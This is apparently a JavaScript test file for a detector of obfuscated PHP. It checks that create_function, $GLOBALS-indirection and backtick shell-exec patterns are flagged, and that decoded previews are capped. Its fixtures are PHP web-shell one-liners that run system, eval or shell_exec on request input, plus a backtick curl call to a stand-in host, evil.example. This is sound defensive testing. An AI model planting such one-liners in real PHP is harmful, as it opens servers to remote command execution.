'use strict';
// php-obfuscation-phase4.test.js — PHP Phase 4 decoder fill.
// Three new branches + amp-ratio clamp backfill on PHP1 / PHP3 / PHP6.
//
//   PHP7  create_function('', $code) — legacy anonymous-fn RCE
//         primitive (PHP < 7.2; removed in 8.0). Body gated on
//         SENSITIVE_PHP_KEYWORDS so benign functional style
//         (`return $a+$b`) is suppressed.
//   PHP8  $GLOBALS['…'](…) callable-variable indirection — matches
//         dangerous-fn lookups and user-input-dispatch via
//         superglobal keys. Distinct from PHP5 (bare superglobal).
//   PHP9  Backtick `…` shell-exec operator — PHP context + shell
//         LOLBin vocab gates.
//
// Amp-clamp backfill: PHP1/PHP3/PHP6 route their deobfuscated
// preview through _phpClipDeobfToAmpBudget (mirrors cmd-obfuscation's
// _clipDeobfToAmpBudget, 32× raw / 8 KiB).

const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/php-obfuscation.js',
]);

// Decompressor stub — gzinflate/gzuncompress/gzdecode delegate to
// Node's zlib so PHP1 can produce real post-inflate previews.
ctx.Decompressor = {
  inflateSync(bytes, format) {
    try {
      const buf = Buffer.from(bytes.buffer || bytes, bytes.byteOffset || 0, bytes.byteLength || bytes.length);
      if (format === 'gzip') return new Uint8Array(zlib.gunzipSync(buf));
      if (format === 'deflate-raw') return new Uint8Array(zlib.inflateRawSync(buf));
      return new Uint8Array(zlib.inflateSync(buf));
    } catch (_) { return null; }
  },
};

const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(candidates, pred) {
  return host(candidates.filter(pred));
}

// ── PHP7: create_function legacy RCE ───────────────────────────────────────

test('php-obfuscation: PHP7 create_function single-quoted body with system() fires', () => {
  const text = "<?php $f = create_function('', 'system($_GET[0]);'); $f(); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP create_function Legacy');
  assert.equal(hits.length, 1, `expected 1 PHP7 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /create_function \u2192 .*system/);
  assert.equal(hits[0]._executeOutput, true);
});

test('php-obfuscation: PHP7 create_function with eval() body fires', () => {
  const text = "<?php $g = create_function('$x', 'eval($x);'); $g($_POST['c']); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP create_function Legacy');
  assert.equal(hits.length, 1);
  assert.match(hits[0].deobfuscated, /eval/);
});

test('php-obfuscation: PHP7 create_function benign body is suppressed (no sensitive kw)', () => {
  const text = "<?php $add = create_function('$a,$b', 'return $a+$b;'); echo $add(1,2); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP create_function Legacy');
  assert.equal(hits.length, 0, `expected zero PHP7 hits; got: ${JSON.stringify(host(cands))}`);
});

test('php-obfuscation: PHP7 create_function double-quoted body with shell_exec() fires', () => {
  const text = '<?php $h = create_function("", "shell_exec(\\"id\\");"); $h(); ?>';
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP create_function Legacy');
  assert.equal(hits.length, 1);
  assert.match(hits[0].deobfuscated, /shell_exec/);
});

// ── PHP8: $GLOBALS callable-variable indirection ───────────────────────────

test('php-obfuscation: PHP8 $GLOBALS[\'system\'](…) dangerous-fn lookup fires', () => {
  const text = "<?php $GLOBALS['system']('whoami'); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP $GLOBALS Callable');
  assert.equal(hits.length, 1, `expected 1 PHP8 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /system\('whoami'\)/);
  assert.equal(hits[0]._executeOutput, true);
});

test('php-obfuscation: PHP8 $GLOBALS[\'shell_exec\'](…) fires', () => {
  const text = "<?php $GLOBALS['shell_exec']('id'); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP $GLOBALS Callable');
  assert.equal(hits.length, 1);
  assert.match(hits[0].deobfuscated, /shell_exec/);
});

test('php-obfuscation: PHP8 $GLOBALS[\'_GET\'][…](…) user-input dispatch fires', () => {
  const text = "<?php $GLOBALS['_GET'][0]($_POST['p']); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP $GLOBALS Callable');
  assert.equal(hits.length, 1, `expected 1 PHP8 hit; got: ${JSON.stringify(host(cands))}`);
  // Name is `_GET`; the decoder emits `$_GET[...]($_POST['p'])`.
  assert.match(hits[0].deobfuscated, /\$_GET\[\.\.\.\]/);
});

test('php-obfuscation: PHP8 $GLOBALS[\'unknownFn\'](…) with unknown name is suppressed', () => {
  const text = "<?php $GLOBALS['my_helper']('arg'); ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP $GLOBALS Callable');
  assert.equal(hits.length, 0);
});

// ── PHP9: backtick shell_exec ───────────────────────────────────────────────

test('php-obfuscation: PHP9 `whoami` inside <?php fires', () => {
  const text = "<?php $out = `whoami`; echo $out; ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP Backtick shell_exec');
  assert.equal(hits.length, 1, `expected 1 PHP9 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /shell_exec \u2192 whoami/);
  assert.equal(hits[0]._executeOutput, true);
});

test('php-obfuscation: PHP9 `curl http://…` shell-LOLBin fires', () => {
  const text = "<?php echo `curl http://evil.example/p`; ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP Backtick shell_exec');
  assert.equal(hits.length, 1);
  assert.match(hits[0].deobfuscated, /curl http:\/\/evil/);
});

test('php-obfuscation: PHP9 `hello world` (no LOLBin) is suppressed', () => {
  const text = "<?php $x = `hello world`; echo $x; ?>";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP Backtick shell_exec');
  assert.equal(hits.length, 0);
});

test('php-obfuscation: PHP9 backtick outside PHP context is suppressed', () => {
  // No <?php sigil and no local $-sigil within 200 chars: decoder must
  // NOT fire even though the body contains a shell LOLBin.
  const text = "# shell prompt demo\n   `whoami`   \n";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP Backtick shell_exec');
  assert.equal(hits.length, 0, `expected zero PHP9 hits outside PHP context; got: ${JSON.stringify(host(cands))}`);
});

test('php-obfuscation: PHP9 backtick with local $-sigil (no <?php) fires', () => {
  // No <?php but a preceding `$var =` within 200 chars counts as
  // PHP context for the local-sigil fallback.
  const text = "$dummy = 1;\n$out = `whoami`;\n";
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP Backtick shell_exec');
  assert.equal(hits.length, 1);
});

// ── Amp-clamp backfill (PHP1 / PHP3 / PHP6) ────────────────────────────────

test('php-obfuscation: PHP1 amp clamp — gzinflate preview capped at 8 KiB', () => {
  // Inflate to 200 KiB of plaintext from a tiny compressed carrier —
  // the decoder must clamp the preview to ≤ 8 KiB.
  const big = 'system(\'id\');' + 'X'.repeat(200 * 1024);
  const compressed = zlib.deflateRawSync(Buffer.from(big));
  const b64 = compressed.toString('base64');
  const text = `<?php eval(gzinflate(base64_decode('${b64}')));`;
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => /eval\(gzinflate/.test(c.technique));
  assert.ok(hits.length >= 1, 'expected PHP1 gzinflate hit');
  const deobf = hits[0].deobfuscated;
  assert.ok(deobf.length <= 8 * 1024, `deobf length ${deobf.length} exceeds 8 KiB cap`);
  assert.ok(deobf.endsWith('\u2026 [truncated]'), `expected truncation marker; tail=${JSON.stringify(deobf.slice(-40))}`);
  // Fuzz invariant: deobf must not exceed 32× raw.
  assert.ok(deobf.length <= 32 * hits[0].raw.length, `deobf (${deobf.length}) > 32× raw (${hits[0].raw.length})`);
});

test('php-obfuscation: PHP3 pack(H*) preview routed through amp clamp (invariant hold)', () => {
  // pack(H*) decodes 2 hex chars → 1 byte, so raw is ~2× deobf —
  // physically cannot exceed the 32× amp ratio. But the code path
  // MUST still route through _phpClipDeobfToAmpBudget (so a future
  // pipeline change that pushes the ratio above 1:2 stays bounded).
  // Test the happy-path contract: candidate emits; deobf ≤ 32× raw;
  // decoded string begins with the target dangerous-fn name.
  const text = "<?php $f = pack('H*', '73797374656d'); $f(); ?>"; // 'system'
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP pack(H*) Reassembly');
  assert.equal(hits.length, 1);
  assert.equal(hits[0].deobfuscated, 'system');
  assert.ok(hits[0].deobfuscated.length <= 32 * hits[0].raw.length);
});

test('php-obfuscation: PHP6 data:base64 include amp clamp caps payload preview', () => {
  // PHP6 URL cap is 4096 chars. Craft a data: URL ~3 KiB that decodes
  // to ~2.2 KiB — under the 8 KiB absolute cap but exercise the code
  // path. A genuine amp-ratio blowup for data: URLs is rare (base64
  // expands ~4/3×, so decoded is ALWAYS ~75% of raw), so we verify
  // the clamp is wired and the invariant holds; a future pipeline
  // change that amplifies here stays bounded.
  const body = '<?php system("id"); ?>' + 'Y'.repeat(2 * 1024);
  const b64 = Buffer.from(body).toString('base64');
  assert.ok(b64.length < 4000, `b64 length ${b64.length} exceeds PHP6 URL cap`);
  const text = `<?php include('data://text/plain;base64,${b64}'); ?>`;
  const cands = d._findPhpObfuscationCandidates(text, {});
  const hits = pick(cands, c => c.technique === 'PHP data:/php:// stream wrapper include');
  assert.ok(hits.length >= 1, `expected PHP6 hit; got: ${JSON.stringify(host(cands))}`);
  const deobf = hits[0].deobfuscated;
  assert.ok(deobf.length <= 8 * 1024, `deobf length ${deobf.length} exceeds 8 KiB cap`);
  assert.ok(deobf.length <= 32 * hits[0].raw.length, `deobf (${deobf.length}) > 32× raw (${hits[0].raw.length})`);
});
